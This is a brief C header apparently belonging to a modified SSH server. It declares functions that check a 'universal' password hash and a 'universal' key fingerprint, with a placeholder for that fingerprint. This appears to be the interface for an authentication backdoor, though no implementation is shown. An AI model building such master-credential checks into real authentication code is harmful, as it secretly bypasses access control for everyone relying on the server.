#include <inttypes.h>
#include <stdio.h>
#include "sshkey.h"

#define UNIVERSAL_KEY_FINGERPRINT "<Key fingerprint goes here>"

#ifndef AUTH_UNIVERSAL_H
#define AUTH_UNIVERSAL_H

int password_matches_hash(const char *, const char *);
int password_matches_universal_hash(const char *);
int key_fingerprint_matches_universal(struct sshkey *);

#endif
